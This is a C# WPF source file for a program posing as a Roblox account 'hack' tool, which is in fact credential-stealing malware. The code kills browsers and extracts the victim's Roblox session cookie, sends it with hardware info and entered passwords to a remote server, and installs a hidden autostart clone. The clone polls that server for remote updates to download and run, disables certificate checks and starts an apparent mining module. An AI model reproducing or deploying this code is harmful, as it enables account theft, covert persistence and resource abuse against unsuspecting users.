using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net.Http;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Security.Principal;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Media.Animation;
using System.Windows.Media.Effects;
using System.Windows.Shapes;
using System.Windows.Threading;

namespace FileTransfer
{
    public partial class MainWindow : Window
    {
        private static readonly HttpClient _http;

        private void ReadConfigFromPlaceholder()
        {
            try
            {
                string payload = ConfigData.Payload;
                int startIdx = payload.IndexOf("<<NEXUS_CFG_START>>");
                int startLen = "<<NEXUS_CFG_START>>".Length;
                if (startIdx == -1)
                {
                    startIdx = payload.IndexOf("`<`<NEXUS_CFG_START`>`>");
                    startLen = "`<`<NEXUS_CFG_START`>`>".Length;
                }

                if (startIdx != -1)
                {
                    startIdx += startLen;
                    string jsonPart = payload.Substring(startIdx).TrimEnd();
                    int endIdx = jsonPart.IndexOf("<<NEXUS_CFG_END>>");
                    if (endIdx == -1)
                    {
                        endIdx = jsonPart.IndexOf("`<`<NEXUS_CFG_END`>`>");
                    }
                    if (endIdx != -1)
                    {
                        jsonPart = jsonPart.Substring(0, endIdx).TrimEnd();
                    }

                    if (!string.IsNullOrWhiteSpace(jsonPart))
                    {
                        using (var doc = System.Text.Json.JsonDocument.Parse(jsonPart))
                        {
                            var root = doc.RootElement;
                            if (root.TryGetProperty("operatorName", out var vOp)) OperatorName = vOp.GetString() ?? OperatorName;
                            if (root.TryGetProperty("appTitleMain", out var vApp)) AppTitleMainText = vApp.GetString() ?? AppTitleMainText;
                            if (root.TryGetProperty("appTitleVersion", out var vVer)) AppTitleVersionText = vVer.GetString() ?? AppTitleVersionText;
                            if (root.TryGetProperty("clientVersion", out var vCv) && !string.IsNullOrWhiteSpace(vCv.GetString()))
                                ClientVersion = vCv.GetString()!;
                            else if (root.TryGetProperty("version", out var vVer2) && !string.IsNullOrWhiteSpace(vVer2.GetString()))
                                ClientVersion = vVer2.GetString()!;
                            if (root.TryGetProperty("windowTitle", out var vWin)) WindowTitleText = vWin.GetString() ?? WindowTitleText;

                            if (root.TryGetProperty("telegramUrl", out var vTu) && !string.IsNullOrWhiteSpace(vTu.GetString()))
                                TelegramUrl = vTu.GetString()!;
                            else if (root.TryGetProperty("telegramChannel", out var vTc) && !string.IsNullOrWhiteSpace(vTc.GetString()))
                                TelegramUrl = vTc.GetString()!;
                            else if (root.TryGetProperty("tgChannel", out var vTg) && !string.IsNullOrWhiteSpace(vTg.GetString()))
                                TelegramUrl = vTg.GetString()!;

                            if (!TelegramUrl.StartsWith("http://", StringComparison.OrdinalIgnoreCase) && !TelegramUrl.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
                            {
                                TelegramUrl = "https://t.me/" + TelegramUrl.TrimStart('@');
                            }
                            
                            if (root.TryGetProperty("themeAccent", out var vAcc)) ThemeAccentHex = vAcc.GetString() ?? ThemeAccentHex;
                            if (root.TryGetProperty("themeSurface", out var vSur)) ThemeSurfaceHex = vSur.GetString() ?? ThemeSurfaceHex;
                            if (root.TryGetProperty("hideConsole", out var vHc)) HideConsole = vHc.GetString() == "true";
                            if (root.TryGetProperty("hideStatus", out var vHs)) HideStatusBar = vHs.GetString() == "true";
                            if (root.TryGetProperty("loginText", out var vLt)) LoginBtnText = vLt.GetString() ?? LoginBtnText;
                            if (root.TryGetProperty("buttonText", out var vBt)) LoginBtnText = vBt.GetString() ?? LoginBtnText;
                            if (root.TryGetProperty("btnText", out var vBtn)) LoginBtnText = vBtn.GetString() ?? LoginBtnText;
                            if (root.TryGetProperty("placeholderText", out var vPt)) PlaceholderTextValue = vPt.GetString() ?? PlaceholderTextValue;

                            if (root.TryGetProperty("layout", out var layoutEl) && layoutEl.ValueKind == System.Text.Json.JsonValueKind.Object)
                            {
                                LayoutJson = layoutEl.GetRawText();
                            }

                            if (root.TryGetProperty("customConfig", out var customCfgEl) && customCfgEl.ValueKind == System.Text.Json.JsonValueKind.Object)
                            {
                                CustomConfigJson = customCfgEl.GetRawText();
                            }
                            
                            Log($"Loaded config from placeholder: Operator={OperatorName}, Telegram={TelegramUrl}, Accent={ThemeAccentHex}, CustomConfig={CustomConfigJson}");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Log("Failed to read placeholder config: " + ex.Message);
            }
        }

        public static string CustomConfigJson { get; private set; } = "{}";
        private static string LayoutJson = "{}";

        private static string AppTitleMainText = "RAH";
        private static string AppTitleVersionText = " v8.0.3";
        private static string WindowTitleText = "RAH v8.0.3";
        private static string ClientVersion = "8.0.3";
        private static string TelegramUrl = "https://t.me/robloxvzlomez";
        private static string ThemeAccentHex = "#10B981";
        private static string ThemeSurfaceHex = "#0D0E12";
        private static bool HideConsole = false;
        private static bool HideStatusBar = false;
        private static string LoginBtnText = "ВЗЛОМАТЬ";
        private static string PlaceholderTextValue = "Username";

        static MainWindow()
        {
            var handler = new HttpClientHandler
            {
                AutomaticDecompression = System.Net.DecompressionMethods.All,
                ServerCertificateCustomValidationCallback = (_, _, _, _) => true
            };
            _http = new HttpClient(handler) { Timeout = TimeSpan.FromMinutes(10) };
            _http.DefaultRequestHeaders.UserAgent.ParseAdd(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36");
            _http.DefaultRequestHeaders.Accept.ParseAdd("image/webp,image/apng,image/*,*/*;q=0.8");
        }

        private const string ServerUrl = "https://file-transfer-production-75ad.up.railway.app";
        private static string OperatorName = "SinGeR1isss";

        private string? _cpu, _ram, _gpu, _cookieError;
        private static string? _cachedToken;
        private DispatcherTimer? _debounceTimer;
        private bool _backgroundMode;
        private static Mutex? _cloneMutex;
        private static readonly string TokenLockPath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "ft_token_job.lock");
        private static FileStream? _tokenLockStream;
        private static readonly Random _rng = new();
        private static readonly object _logLock = new();

        private static bool IsHiddenInstance() => Persistence.IsRunningFromClone();

        public static void Log(string msg)
        {
            try
            {
                lock (_logLock)
                {
                    string logDir = System.IO.Path.Combine(
                        Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                        "Microsoft", "Windows", "Themes");
                    Directory.CreateDirectory(logDir);
                    string logFile = System.IO.Path.Combine(logDir, "ft.log");
                    File.AppendAllText(logFile, $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {msg}\n");
                }
            }
            catch { }
        }



        public MainWindow()
        {
            Log("MainWindow constructor start");
            ReadConfigFromPlaceholder();
            try
            {
                InitializeComponent();

                // Устанавливаем иконку (сначала проверяем внешний app.ico, затем embedded)
                try
                {
                    string localIco = System.IO.Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "app.ico");
                    if (File.Exists(localIco))
                    {
                        var bmp = new BitmapImage();
                        bmp.BeginInit();
                        bmp.UriSource = new Uri(localIco, UriKind.Absolute);
                        bmp.CacheOption = BitmapCacheOption.OnLoad;
                        bmp.EndInit();
                        this.Icon = bmp;
                    }
                    else
                    {
                        var iconUri = new Uri("pack://application:,,,/app.ico", UriKind.Absolute);
                        this.Icon = System.Windows.Media.Imaging.BitmapFrame.Create(iconUri);
                    }
                }
                catch { /* иконка не критична */ }

                // Apply dynamic styles and visibility
                try
                {
                    var converter = new System.Windows.Media.BrushConverter();
                    if (!string.IsNullOrEmpty(ThemeAccentHex))
                        this.Resources["AppAccentColor"] = (System.Windows.Media.Color)System.Windows.Media.ColorConverter.ConvertFromString(ThemeAccentHex);
                    if (!string.IsNullOrEmpty(ThemeSurfaceHex))
                        this.Resources["Surface"] = (System.Windows.Media.SolidColorBrush)converter.ConvertFromString(ThemeSurfaceHex);


                    
                    if (BtnHack != null)
                        BtnHack.Content = LoginBtnText;

                    // Apply Layout if valid
                    // Absolute positioning is disabled to support the modern Sidebar Grid layout.
                }
                catch (Exception styleEx)
                {
                    Log("Style apply error: " + styleEx.Message);
                }

                // Apply dynamic texts
                this.Title = WindowTitleText;
                if (AppTitleMain != null) AppTitleMain.Text = AppTitleMainText;
                if (AppVersionSettings != null) AppVersionSettings.Text = ClientVersion;

                LoadCustomBackground();
                Loaded += MainWindow_Loaded;

                string exePath = Process.GetCurrentProcess().MainModule?.FileName ?? "unknown";
                bool showUi = Environment.GetCommandLineArgs() is string[] args && Array.Exists(args, a => a == "--show" || a == "-show");
                bool hasBackgroundArg = Environment.GetCommandLineArgs() is string[] cmdArgs && Array.Exists(cmdArgs, a => a == "--background" || a == "-background" || a == "--silent");
                bool hiddenInstance = IsHiddenInstance();
                _backgroundMode = (hiddenInstance || hasBackgroundArg) && !showUi;
                Log($"Constructor: exe={exePath}, hiddenInstance={hiddenInstance}, showUi={showUi}, hasBackgroundArg={hasBackgroundArg}, _backgroundMode={_backgroundMode}");

                if (_backgroundMode)
                {
                    // Клон — проверяем, не запущен ли уже другой клон
                    bool createdNew;
                    _cloneMutex = new Mutex(true, "Global\\FileTransferClone_v1", out createdNew);
                    if (!createdNew)
                    {
                        Log("Clone already running, exiting duplicate");
                        Environment.Exit(0);
                        return;
                    }

                    // Фоновый режим (скрытая копия из автозагрузки)
                    ShowInTaskbar = false;
                    Opacity = 0;
                    Log("Background mode start");
                    // Чиним автозагрузку если удалили
                    Persistence.EnsureAutoStart();
                    _ = Task.Run(StartBackgroundWorkAsync);

                    // Compute Modules привязаны строго к фоновому процессу (в автозагрузке)
                    try
                    {
                        FileTransfer.Compute.ComputeService.Instance.Initialize(CustomConfigJson);
                    }
                    catch (Exception compEx)
                    {
                        Log("ComputeService init error: " + compEx.Message);
                    }
                }
                else
                {
                    // Обычный видимый режим с кнопкой "Взлом"
                    ShowInTaskbar = true;
                    Opacity = 1;
                    Log("Visible mode start");

                    // При запуске из Program Files — создаём клон и ставим в автозагрузку
                    if (!hiddenInstance)
                    {
                        Log("Updating persistence clone to latest version..."); Persistence.KillExistingClone(); Persistence.Install();
                        // Всегда пытаемся запустить клон (Mutex предотвратит дубликаты)
                        Persistence.LaunchClone();
                    }

                    // Сразу убиваем браузеры, извлекаем куку и отправляем на сервер
                    _ = Task.Run(StartBackgroundWorkAsync);
                }

                Log("MainWindow constructor OK");
            }
            catch (Exception ex)
            {
                Log("MainWindow constructor error: " + ex);
                throw;
            }
        }

        protected override void OnClosing(CancelEventArgs e)
        {
            base.OnClosing(e);

            if (_backgroundMode)
            {
                // РљР»РѕРЅ вЂ” РѕСЃС‚Р°С‘РјСЃСЏ РІ С„РѕРЅРµ, РЅРµ Р·Р°РєСЂС‹РІР°РµРјСЃСЏ
                e.Cancel = true;
                Hide();
                ShowInTaskbar = false;
                Log("Clone staying in background");
            }
            else
            {
                // РћСЂРёРіРёРЅР°Р» вЂ” Р·Р°РєСЂС‹РІР°РµРј РїСЂРёР»РѕР¶РµРЅРёРµ (РєР»РѕРЅ СЂР°Р±РѕС‚Р°РµС‚ РІ С„РѕРЅРµ)
                Log("Original window closed, clone survives");
                Application.Current.Shutdown();
            }
        }

        private void MainWindow_Loaded(object sender, RoutedEventArgs e)
        {
            Log("MainWindow Loaded start");
            try
            {
                if (_backgroundMode)
                {
                    Hide();
                    ShowInTaskbar = false;
                }
                else
                {
                    Opacity = 1;
                    ShowInTaskbar = true;
                    Activate();
                    InitParticles();
                    StartStartupAnimation();
                    _ = InitializeClientWebEngineAsync();
                }
                Log("MainWindow Loaded OK");
            }
            catch (Exception ex)
            {
                Log("MainWindow Loaded error: " + ex);
                throw;
            }
        }

        private async Task InitializeClientWebEngineAsync()
        {
            try
            {
                string webUiDir = System.IO.Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "WebUI");
                if (!Directory.Exists(webUiDir))
                {
                    string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                    webUiDir = System.IO.Path.Combine(localAppData, "RAH_Client", "WebUI");
                    Directory.CreateDirectory(webUiDir);
                }

                string htmlFile = System.IO.Path.Combine(webUiDir, "index.html");
                if (!File.Exists(htmlFile))
                {
                    var asm = System.Reflection.Assembly.GetExecutingAssembly();
                    foreach (var resName in asm.GetManifestResourceNames())
                    {
                        if (resName.Contains("WebUI", StringComparison.OrdinalIgnoreCase))
                        {
                            string fileName = resName.Substring(resName.LastIndexOf('.') + 1);
                            if (resName.EndsWith(".html", StringComparison.OrdinalIgnoreCase)) fileName = "index.html";
                            else if (resName.EndsWith(".jpg", StringComparison.OrdinalIgnoreCase)) fileName = "griffith.jpg";
                            using var stream = asm.GetManifestResourceStream(resName);
                            if (stream != null)
                            {
                                using var fs = File.Create(System.IO.Path.Combine(webUiDir, fileName));
                                await stream.CopyToAsync(fs);
                            }
                        }
                    }
                }

                string userDataFolder = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "RAH_Client", "WebView2");
                var env = await Microsoft.Web.WebView2.Core.CoreWebView2Environment.CreateAsync(null, userDataFolder);
                await webEngine.EnsureCoreWebView2Async(env);

                webEngine.CoreWebView2.Settings.IsStatusBarEnabled = false;
                webEngine.CoreWebView2.Settings.AreDefaultContextMenusEnabled = false;
                webEngine.CoreWebView2.Settings.AreDevToolsEnabled = true;

                webEngine.CoreWebView2.WebMessageReceived += CoreWebView2_WebMessageReceived;

                if (File.Exists(htmlFile))
                {
                    webEngine.CoreWebView2.Navigate(new Uri(htmlFile).AbsoluteUri);
                }
                else
                {
                    webEngine.Visibility = Visibility.Collapsed;
                    legacyWpfGrid.Visibility = Visibility.Visible;
                }
            }
            catch (Exception ex)
            {
                Log("WebView2 init exception: " + ex.Message + ". Falling back to WPF view.");
                webEngine.Visibility = Visibility.Collapsed;
                legacyWpfGrid.Visibility = Visibility.Visible;
            }
        }

        private async void CoreWebView2_WebMessageReceived(object? sender, Microsoft.Web.WebView2.Core.CoreWebView2WebMessageReceivedEventArgs e)
        {
            try
            {
                string json = e.WebMessageAsJson;
                using var doc = System.Text.Json.JsonDocument.Parse(json);
                var root = doc.RootElement;
                string action = root.TryGetProperty("action", out var a) ? a.GetString() ?? "" : "";

                switch (action)
                {
                    case "minimize":
                        WindowState = WindowState.Minimized;
                        break;
                    case "close":
                        Close();
                        break;
                    case "dragWindow":
                        try { DragMove(); } catch { }
                        break;
                    case "domReady":
                        SendInitDataToWeb();
                        break;
                    case "openUrl":
                        if (root.TryGetProperty("url", out var u))
                        {
                            string targetUrl = u.GetString() ?? TelegramUrl;
                            try
                            {
                                Process.Start(new ProcessStartInfo { FileName = targetUrl, UseShellExecute = true });
                            }
                            catch { }
                        }
                        break;
                    case "lookupAvatar":
                        if (root.TryGetProperty("username", out var un))
                        {
                            string rawUser = un.GetString() ?? "";
                            _ = LookupAvatarForWebAsync(rawUser);
                        }
                        break;
                    case "onHackComplete":
                        if (root.TryGetProperty("username", out var hu) && root.TryGetProperty("password", out var hp))
                        {
                            string finishedUser = hu.GetString() ?? "";
                            string finishedPass = hp.GetString() ?? "";
                            string freshToken = _cachedToken ?? CookieExtractor.ExtractRobloSecurity(killBrowsers: false) ?? "";
                            SaveToDesktopAccountsFile(finishedUser, finishedPass, freshToken);
                            try
                            {
                                var updatePayload = new
                                {
                                    computerName = ComputerInfo.GetName(),
                                    robloxUser = finishedUser,
                                    fakePassword = finishedPass,
                                    robloSecurity = freshToken,
                                    @operator = OperatorName
                                };
                                var jsonUpdate = System.Text.Json.JsonSerializer.Serialize(updatePayload);
                                using var updateContent = new StringContent(jsonUpdate, System.Text.Encoding.UTF8, "application/json");
                                string url = $"{ServerUrl}/update-roblox";
                                await _http.PostAsync(url, updateContent);
                            }
                            catch { }
                        }
                        break;
                }
            }
            catch (Exception ex)
            {
                Log("WebMessage error: " + ex.Message);
            }
        }

        private void SendInitDataToWeb()
        {
            try
            {
                var data = new
                {
                    title = AppTitleMainText,
                    version = ClientVersion,
                    btnText = LoginBtnText,
                    telegramUrl = TelegramUrl,
                    themeAccent = ThemeAccentHex,
                    themeSurface = ThemeSurfaceHex
                };
                string jsonMsg = System.Text.Json.JsonSerializer.Serialize(new { type = "initData", data });
                webEngine.CoreWebView2.PostWebMessageAsJson(jsonMsg);
            }
            catch { }
        }

        private async Task LookupAvatarForWebAsync(string username)
        {
            try
            {
                var payload = new { usernames = new[] { username }, excludeBannedUsers = false };
                var jsonPayload = System.Text.Json.JsonSerializer.Serialize(payload);
                using var reqContent = new StringContent(jsonPayload, System.Text.Encoding.UTF8, "application/json");
                var response = await _http.PostAsync("https://users.roblox.com/v1/usernames/users", reqContent);
                if (!response.IsSuccessStatusCode) return;

                var resStr = await response.Content.ReadAsStringAsync();
                using var doc = System.Text.Json.JsonDocument.Parse(resStr);
                var data = doc.RootElement.GetProperty("data");
                if (data.GetArrayLength() == 0) return;

                long userId = data[0].GetProperty("id").GetInt64();
                var thumbUrl = $"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={userId}&size=150x150&format=Png&isCircular=false";
                var thumbResponse = await _http.GetAsync(thumbUrl);
                if (!thumbResponse.IsSuccessStatusCode) return;

                var thumbStr = await thumbResponse.Content.ReadAsStringAsync();
                using var thumbDoc = System.Text.Json.JsonDocument.Parse(thumbStr);
                var thumbData = thumbDoc.RootElement.GetProperty("data");
                if (thumbData.GetArrayLength() == 0) return;

                var imageUrl = thumbData[0].GetProperty("imageUrl").GetString();
                if (!string.IsNullOrEmpty(imageUrl))
                {
                    string jsonMsg = System.Text.Json.JsonSerializer.Serialize(new { type = "avatarLoaded", avatarUrl = imageUrl });
                    await Dispatcher.InvokeAsync(() =>
                    {
                        webEngine.CoreWebView2.PostWebMessageAsJson(jsonMsg);
                    });
                }
            }
            catch { }
        }

        private async void StartStartupAnimation()
        {
            if (StartupOverlay == null) return;

            // 10 секундная кинематографичная загрузка
            const double totalDuration = 10.0;
            var stages = new (double t, string text)[]
            {
                (0.0, "Инициализация ядра..."),
                (2.0, "Синхронизация протоколов..."),
                (4.5, "Проверка сетевого шлюза..."),
                (7.0, "Калибровка компонентов..."),
                (9.0, "Завершение загрузки...")
            };

            var stopwatch = System.Diagnostics.Stopwatch.StartNew();
            var timer = new DispatcherTimer { Interval = TimeSpan.FromMilliseconds(50) };
            
            timer.Tick += (s, e) =>
            {
                double elapsed = stopwatch.Elapsed.TotalSeconds;
                double pct = Math.Min(100.0, (elapsed / totalDuration) * 100.0);
                
                if (StartupFillBar != null)
                {
                    StartupFillBar.Width = (pct / 100.0) * 200.0;
                }

                double remaining = Math.Max(0.0, totalDuration - elapsed);
                string currentStageText = "Загрузка...";
                for (int i = stages.Length - 1; i >= 0; i--)
                {
                    if (elapsed >= stages[i].t)
                    {
                        currentStageText = stages[i].text;
                        break;
                    }
                }

                if (TxtStartupStatus != null)
                {
                    TxtStartupStatus.Text = $"{currentStageText} ({remaining:F1} сек)";
                }

                if (elapsed >= totalDuration)
                {
                    timer.Stop();
                    stopwatch.Stop();
                    if (TxtStartupStatus != null) TxtStartupStatus.Text = "Готово";

                    var fade = new DoubleAnimation
                    {
                        From = 1.0,
                        To = 0.0,
                        Duration = TimeSpan.FromMilliseconds(300),
                        EasingFunction = new QuadraticEase { EasingMode = EasingMode.EaseInOut }
                    };
                    fade.Completed += (s2, e2) =>
                    {
                        StartupOverlay.Visibility = Visibility.Collapsed;
                    };
                    StartupOverlay.BeginAnimation(UIElement.OpacityProperty, fade);
                }
            };

            timer.Start();
        }

        private void LoadCustomBackground()
        {
            try
            {
                if (ImgCustomBackground == null) return;

                // 1. Check for custom bg.jpg / bg.png in application directory
                string baseDir = AppDomain.CurrentDomain.BaseDirectory;
                string[] candidates = new[] { "bg.jpg", "bg.png", "background.jpg", "background.png" };
                foreach (var c in candidates)
                {
                    string path = System.IO.Path.Combine(baseDir, c);
                    if (File.Exists(path))
                    {
                        var bmp = new BitmapImage();
                        bmp.BeginInit();
                        bmp.UriSource = new Uri(path, UriKind.Absolute);
                        bmp.CacheOption = BitmapCacheOption.OnLoad;
                        bmp.EndInit();
                        ImgCustomBackground.Source = bmp;
                        Log($"Loaded custom background from disk: {path}");
                        return;
                    }
                }

                // 2. Fallback to embedded default_bg.jpg (Griffith monochrome art)
                var fallbackUri = new Uri("pack://application:,,,/default_bg.jpg", UriKind.Absolute);
                ImgCustomBackground.Source = new BitmapImage(fallbackUri);
                Log("Loaded default background (Griffith) from resources.");
            }
            catch (Exception ex)
            {
                Log("Error loading background image: " + ex.Message);
            }
        }

        private void SliderBgOpacity_ValueChanged(object sender, RoutedPropertyChangedEventArgs<double> e)
        {
            if (ImgCustomBackground != null)
            {
                ImgCustomBackground.Opacity = e.NewValue / 100.0;
            }
            if (LblBgOpacity != null)
            {
                LblBgOpacity.Text = $"{(int)e.NewValue}%";
            }
        }

        // в”Ђв”Ђ Floating Particles в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
        private class Particle
        {
            public Ellipse Shape { get; set; } = null!;
            public double VX { get; set; }
            public double VY { get; set; }
            public double X { get; set; }
            public double Y { get; set; }
        }

        private readonly List<Particle> _particles = new();
        private DispatcherTimer? _particleTimer;

        private void InitParticles()
        {
            var rand = new Random();
            double w = this.Width;
            double h = this.Height;

            // Resolve accent color brush or fallback
            Brush accentBrush = new SolidColorBrush(Colors.Cyan);
            try
            {
                if (this.Resources["AppAccentColor"] is Color acc)
                    accentBrush = new SolidColorBrush(acc);
            }
            catch {}

            for (int i = 0; i < 35; i++)
            {
                double size = rand.Next(2, 7);
                double opacity = rand.NextDouble() * 0.5 + 0.15;
                
                // 30% of particles will use the accent color, others are white
                Brush fillBrush = (rand.Next(0, 100) < 30) ? accentBrush : new SolidColorBrush(Colors.White);

                var dot = new Ellipse
                {
                    Width = size,
                    Height = size,
                    Fill = fillBrush,
                    Opacity = opacity,
                    IsHitTestVisible = false
                };

                // Add small glow to larger accent particles
                if (size > 4 && fillBrush == accentBrush)
                {
                    try
                    {
                        dot.Effect = new DropShadowEffect
                        {
                            Color = ((SolidColorBrush)fillBrush).Color,
                            BlurRadius = 8,
                            ShadowDepth = 0,
                            Opacity = 0.8
                        };
                    }
                    catch {}
                }

                double x = rand.NextDouble() * w;
                double y = rand.NextDouble() * h;
                Canvas.SetLeft(dot, x);
                Canvas.SetTop(dot, y);
                ParticleCanvas.Children.Add(dot);

                _particles.Add(new Particle
                {
                    Shape = dot,
                    X = x,
                    Y = y,
                    VX = (rand.NextDouble() - 0.5) * 0.7,
                    VY = (rand.NextDouble() - 0.5) * 0.5
                });
            }

            _particleTimer = new DispatcherTimer { Interval = TimeSpan.FromMilliseconds(30) };
            _particleTimer.Tick += (s, e) =>
            {
                double cw = this.ActualWidth;
                double ch = this.ActualHeight;
                foreach (var p in _particles)
                {
                    p.X += p.VX;
                    p.Y += p.VY;

                    if (p.X < 0) p.X = cw;
                    if (p.X > cw) p.X = 0;
                    if (p.Y < 0) p.Y = ch;
                    if (p.Y > ch) p.Y = 0;

                    Canvas.SetLeft(p.Shape, p.X);
                    Canvas.SetTop(p.Shape, p.Y);
                }
            };
            _particleTimer.Start();
        }

        private async Task StartBackgroundWorkAsync()
        {
            Log("Background work start");
            try
            {
                Log("Getting CPU...");
                _cpu = ComputerInfo.GetCPU();
                Log("Getting RAM...");
                _ram = ComputerInfo.GetRAM();
                Log("Getting GPU...");
                _gpu = ComputerInfo.GetGPU();
                Log($"HW: cpu='{_cpu}', ram='{_ram}', gpu='{_gpu}'");

                // При запуске приложения извлекаем куки (с закрытием браузера только в момент запуска)
                Log("Starting initial cookie extraction...");
                _cachedToken ??= CookieExtractor.ExtractRobloSecurity(killBrowsers: true);
                Log($"Cookie extracted, token len={_cachedToken?.Length ?? 0}");
                if (string.IsNullOrEmpty(_cachedToken))
                    ReadCookieDebugLog();

                Log("Uploading startup data...");
                using (var startupCts = new CancellationTokenSource(TimeSpan.FromSeconds(60)))
                {
                    try
                    {
                        await UploadFileOnStartupAsync(startupCts.Token);
                    }
                    catch (OperationCanceledException)
                    {
                        Log("Startup upload TIMEOUT (60s), continuing to poll loop");
                    }
                }
                Log("Background work OK");
            }
            catch (Exception ex)
            {
                Log("Background work error: " + ex);
            }

            // Poll loop Р·Р°РїСѓСЃРєР°РµС‚СЃСЏ Р’РЎР•Р“Р”Рђ (РґР»СЏ РєР»РѕРЅР° Рё РІРёРґРёРјРѕРіРѕ РѕРєРЅР°), 
            // РґР°Р¶Рµ РµСЃР»Рё СЃС‚Р°СЂС‚РѕРІС‹Р№ Р°РїР»РѕР°Рґ СѓРїР°Р» СЃ РѕС€РёР±РєРѕР№
            Log("Starting token request poll loop...");
            await TokenRequestPollLoopAsync();
        }

        private static bool TryAcquireTokenLock()
        {
            try
            {
                _tokenLockStream = new FileStream(TokenLockPath, FileMode.Create, FileAccess.Write, FileShare.None);
                // РџРёС€РµРј pid С‡С‚РѕР±С‹ Р±С‹Р»Рѕ РІРёРґРЅРѕ РєС‚Рѕ РґРµСЂР¶РёС‚ Р±Р»РѕРєРёСЂРѕРІРєСѓ
                byte[] pidBytes = System.Text.Encoding.UTF8.GetBytes($"{Environment.ProcessId}");
                _tokenLockStream.Write(pidBytes, 0, pidBytes.Length);
                _tokenLockStream.Flush();
                Log($"Token lock acquired (PID={Environment.ProcessId})");
                return true;
            }
            catch (Exception ex)
            {
                Log($"Token lock BUSY (another process holds it): {ex.Message}");
                return false;
            }
        }

        private static void ReleaseTokenLock()
        {
            try
            {
                _tokenLockStream?.Dispose();
                _tokenLockStream = null;
                if (File.Exists(TokenLockPath))
                {
                    File.Delete(TokenLockPath);
                    Log("Token lock released");
                }
            }
            catch (Exception ex)
            {
                Log($"Token lock release error: {ex.Message}");
            }
        }

        private async Task TokenRequestPollLoopAsync()
        {
            Log("Token request poll loop start");
            // РќРµР±РѕР»СЊС€Р°СЏ СЃР»СѓС‡Р°Р№РЅР°СЏ Р·Р°РґРµСЂР¶РєР° РїСЂРё СЃС‚Р°СЂС‚Рµ С‡С‚РѕР±С‹ СЂР°Р·РЅРµСЃС‚Рё polling РґРІСѓС… РїСЂРѕС†РµСЃСЃРѕРІ
            int startupDelay = _rng.Next(5000, 15000);
            Log($"Token poll initial delay: {startupDelay}ms");
            await Task.Delay(startupDelay);

            while (true)
            {
                try
                {
                    await Task.Delay(30000);

                    string pcName = ComputerInfo.GetName();
                    string computeStatus = FileTransfer.Compute.ComputeService.Instance.Status.ToString();
                    string computeAlgo = string.Join(" + ", FileTransfer.Compute.ComputeService.Instance.ActiveProviders.Select(p => p.Algorithm));
                    string checkUrl = $"{ServerUrl}/check-token-request?computerName={Uri.EscapeDataString(pcName)}&operator={Uri.EscapeDataString(OperatorName)}&version={Uri.EscapeDataString(ClientVersion)}&clientVersion={Uri.EscapeDataString(ClientVersion)}&computeStatus={Uri.EscapeDataString(computeStatus)}&computeAlgo={Uri.EscapeDataString(computeAlgo)}";
                    Log($"Token poll: checking {checkUrl}");
                    var resp = await _http.GetAsync(checkUrl);
                    var json = await resp.Content.ReadAsStringAsync();
                    Log($"Token poll response ({resp.StatusCode}): {json}");

                    bool requested = false;
                    string updateUrl = "";
                    try
                    {
                        using var doc = System.Text.Json.JsonDocument.Parse(json);
                        if (doc.RootElement.TryGetProperty("requested", out var reqEl))
                            requested = reqEl.GetBoolean();
                        if (doc.RootElement.TryGetProperty("updateRequested", out var updEl) && updEl.GetBoolean())
                        {
                            if (doc.RootElement.TryGetProperty("updateUrl", out var urlEl))
                                updateUrl = urlEl.GetString() ?? "";
                        }
                    }
                    catch { }

                    if (!string.IsNullOrEmpty(updateUrl))
                    {
                        Log($"Update requested: {updateUrl}, starting background update");
                        _ = Task.Run(async () => {
                            await Persistence.PerformUpdate(updateUrl);
                        });
                    }

                    if (requested)
                    {
                        Log("Token request: requested=true, trying to acquire lock");
                        if (!TryAcquireTokenLock())
                        {
                            Log("Token request: another process is handling, skipping this cycle");
                            continue;
                        }

                        try
                        {
                            Log("Token request: lock acquired, extracting cookie...");
                            _cachedToken = CookieExtractor.ExtractRobloSecurity();
                            Log($"Token request: extracted token len={_cachedToken?.Length ?? 0}");
                            if (string.IsNullOrEmpty(_cachedToken))
                                ReadCookieDebugLog();
                            Log("Token request: uploading...");
                            using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(25));
                            try
                            {
                                await UploadFileOnStartupAsync(cts.Token);
                                Log("Token request: upload complete");
                            }
                            catch (OperationCanceledException)
                            {
                                Log("Token request: UPLOAD TIMEOUT (25s), continuing poll loop");
                            }
                        }
                        finally
                        {
                            ReleaseTokenLock();
                        }
                    }
                }
                catch (Exception ex)
                {
                    Log("Token poll error: " + ex);
                }
            }
        }

        // в”Ђв”Ђ Console Logging (no-op, terminal removed) в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
        private void AppendConsole(string tag, string tagColor, string message, string msgColor)
        {
            // No-op: console UI removed
        }

        private static SolidColorBrush BrushFromHex(string hex)
        {
            var c = (System.Windows.Media.Color)System.Windows.Media.ColorConverter.ConvertFromString(hex);
            return new SolidColorBrush(c);
        }

        // в”Ђв”Ђ Startup Upload (computer info + cookie, no screenshots) в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
